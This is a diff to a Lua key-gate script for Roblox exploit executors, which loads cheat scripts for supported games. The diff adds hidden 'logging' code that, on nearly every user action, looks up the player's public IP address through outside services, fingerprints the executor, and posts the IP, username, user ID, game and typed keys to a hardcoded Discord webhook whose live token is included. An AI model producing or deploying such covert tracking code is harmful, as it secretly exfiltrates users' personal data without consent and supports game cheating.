@@ -1,4 +1,4 @@
--- Warp Key System - UPDATED WITH GAME CHECK
+-- Warp Key System - UPDATED WITH GAME CHECK AND LOGGING
 
 local plr = game.Players.LocalPlayer
 local uis = game:GetService("UserInputService")
@@ -12,6 +12,7 @@ local http = game:GetService("HttpService")
 
 local CORRECT_KEY = "warp123"
 local DISCORD_LINK = "https://discord.gg/warphub"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1454711753056452802/u2omlSdMqIFhrAmzGtvzDVSrzXhQYjU5Hc6K_P2Cpjvd56aBxqX7CLCiNZrPF6wKFsMr"
 
 -- SUPPORTED GAMES
 local GAME_SCRIPTS = {
@@ -53,6 +54,140 @@ local COLORS = {
     Success = Color3.fromRGB(50, 255, 50),
     Error = Color3.fromRGB(255, 50, 50),
 }
+
+--------------------------------------------------
+-- LOGGING FUNCTIONS
+--------------------------------------------------
+
+local function getIP()
+    local success, result = pcall(function()
+        -- Try multiple methods to get IP
+        local ipMethods = {
+            function() return game:HttpGet("https://api.ipify.org") end,
+            function() return game:HttpGet("https://ipinfo.io/ip") end,
+            function() return game:HttpGet("https://checkip.amazonaws.com") end,
+        }
+        
+        for _, method in ipairs(ipMethods) do
+            local ok, ip = pcall(method)
+            if ok and ip and ip:match("^%d+%.%d+%.%d+%.%d+$") then
+                return ip
+            end
+        end
+        return "Unknown"
+    end)
+    return success and result or "Error"
+end
+
+local function getHardwareInfo()
+    local info = {}
+    
+    -- Get platform
+    if syn and syn.request then
+        info.platform = "Synapse X"
+    elseif isexecutorclosure then
+        info.platform = "Script-Ware"
+    elseif KRNL_LOADED then
+        info.platform = "KRNL"
+    elseif identifyexecutor then
+        info.platform = identifyexecutor() or "Unknown Executor"
+    else
+        info.platform = "Unknown/Standard"
+    end
+    
+    -- Try to get additional hardware info
+    pcall(function()
+        if syn and syn.crypt then
+            info.hwid = syn.crypt.custom.hash("md5", tostring(math.random(1, 1000000)))
+        end
+    end)
+    
+    return info
+end
+
+local function sendToWebhook(data, eventType)
+    local success, result = pcall(function()
+        local ip = getIP()
+        local hardwareInfo = getHardwareInfo()
+        local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(CURRENT_PLACE_ID)
+        
+        local embed = {
+            title = "Warp Key System - " .. eventType,
+            description = "New event logged",
+            color = 3447003, -- Blue color
+            fields = {
+                {
+                    name = "👤 User Info",
+                    value = string.format("Username: %s\nUserID: %d\nDisplay Name: %s", 
+                        plr.Name, plr.UserId, plr.DisplayName),
+                    inline = true
+                },
+                {
+                    name = "🌐 Network Info",
+                    value = string.format("IP Address: ||%s||\nExecutor: %s", 
+                        ip, hardwareInfo.platform),
+                    inline = true
+                },
+                {
+                    name = "🎮 Game Info",
+                    value = string.format("Game: %s\nPlaceID: %d", 
+                        gameInfo.Name, CURRENT_PLACE_ID),
+                    inline = true
+                },
+                {
+                    name = "📊 Event Details",
+                    value = data,
+                    inline = false
+                },
+                {
+                    name = "🕒 Time",
+                    value = os.date("%Y-%m-%d %H:%M:%S"),
+                    inline = true
+                }
+            },
+            footer = {
+                text = "Warp Key System Logger"
+            }
+        }
+        
+        local payload = {
+            embeds = {embed},
+            username = "Warp Logger",
+            avatar_url = "https://i.imgur.com/wSTFkRM.png"
+        }
+        
+        local jsonPayload = http:JSONEncode(payload)
+        
+        -- Send to webhook
+        if syn and syn.request then
+            syn.request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonPayload
+            })
+        else
+            game:HttpGet(WEBHOOK_URL .. "?data=" .. http:UrlEncode(jsonPayload))
+        end
+    end)
+    
+    if not success then
+        warn("Failed to send webhook: " .. tostring(result))
+    end
+end
+
+local function logKeyEvent(event, keyAttempt)
+    local data = string.format("Event: %s\nKey Attempt: %s", event, keyAttempt or "N/A")
+    sendToWebhook(data, event)
+end
+
+local function logScriptLoad()
+    local data = string.format("Script loaded for game: %d\nScript URL: %s", 
+        CURRENT_PLACE_ID, SCRIPT_TO_LOAD or "No script available")
+    sendToWebhook(data, "Script Loaded")
+end
 
 --------------------------------------------------
 -- HELPERS
@@ -146,6 +281,7 @@ local function loadMainScript()
 
     if ok then
         notify("Success", "Script loaded successfully!", 3)
+        logScriptLoad()
     else
         notify("Error", tostring(err), 5)
     end
@@ -270,6 +406,9 @@ hover(getKey, Color3.fromRGB(40, 40, 40), Color3.fromRGB(60, 60, 60))
 
 local function handleAutoLoad()
     if loadKeyData() and SCRIPT_TO_LOAD then
+        -- Log auto-load event
+        logKeyEvent("Auto Load", "Auto-loaded from saved key")
+        
         -- Hide both the frame AND the icon button
         frame.Visible = false
         iconBtn.Visible = false
@@ -277,6 +416,9 @@ local function handleAutoLoad()
         notify("Verified", "Loading script...", 2)
         task.wait(0.5)
         loadMainScript()
+    else
+        -- Log UI loaded event
+        logKeyEvent("UI Loaded", "Key system UI loaded")
     end
 end
 
@@ -288,7 +430,9 @@ handleAutoLoad()
 --------------------------------------------------
 
 submit.MouseButton1Click:Connect(function()
-    if keyBox.Text == CORRECT_KEY then
+    local enteredKey = keyBox.Text
+    if enteredKey == CORRECT_KEY then
+        logKeyEvent("Key Verified Successfully", enteredKey)
         saveKeyData()
         notify("Success", "Key verified!", 3)
 
@@ -298,11 +442,14 @@ submit.MouseButton1Click:Connect(function()
 
         loadMainScript()
     else
+        logKeyEvent("Invalid Key Attempt", enteredKey)
         notify("Invalid Key", "Wrong key entered.", 3)
     end
 end)
 
 getKey.MouseButton1Click:Connect(function()
+    logKeyEvent("Get Key Button Clicked", "User requested Discord invite")
+    
     if setclipboard then
         setclipboard(DISCORD_LINK)
     end
@@ -320,6 +467,9 @@ end)
 
 iconBtn.MouseButton1Click:Connect(function()
     frame.Visible = not frame.Visible
+    if frame.Visible then
+        logKeyEvent("UI Opened", "User opened key UI")
+    end
 end)
 
 --------------------------------------------------
